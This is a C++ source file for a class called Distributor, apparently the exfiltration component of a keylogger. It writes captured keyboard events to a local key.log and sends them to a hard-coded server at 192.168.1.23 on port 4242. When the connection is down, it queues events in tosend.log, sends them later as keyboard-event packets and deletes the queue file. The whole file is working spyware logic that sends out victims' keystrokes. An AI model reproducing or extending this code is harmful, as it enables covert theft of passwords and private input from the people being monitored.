#include "Distributor.h"

Distributor::Distributor()
{
}

Distributor::~Distributor()
{
}

void Distributor::init(void)
{
	_client.connect("192.168.1.23", "4242");
	//_client.connect("10.101.54.75", "4242");
	_client.run();

	_log.open(StaticTools::GetProjectResourceDirectory() + "\\key.log");
}

void Distributor::destroy(void)
{
	_client.disconnect();
}

IDistributor &Distributor::operator<<(AInputType &entry)
{
	entry.format(_log.getSize());

	entry >> _log;
	if (_client.isConnected()) {
		if (_tosend.getSize() > 0) {
			sendToSend();
		}
		entry >> _client;
	}
	else {
		if (!_tosend.isOpen()) {
			_tosend.open(StaticTools::GetProjectResourceDirectory() + "\\tosend.log");
		}
		entry >> _tosend;
	}
	return (*this);
}

void Distributor::sendToSend(void)
{
	_tosend.close();

	std::ifstream ifs(_tosend.getFilename());
	std::string line;

	if (ifs) {
		while (std::getline(ifs, line)) {
			_client << StaticTools::CreatePacket(PacketType::PT_KeyboardEvent, line + '\n');
		}
		ifs.close();
	}

	boost::filesystem::remove(_tosend.getFilename());
}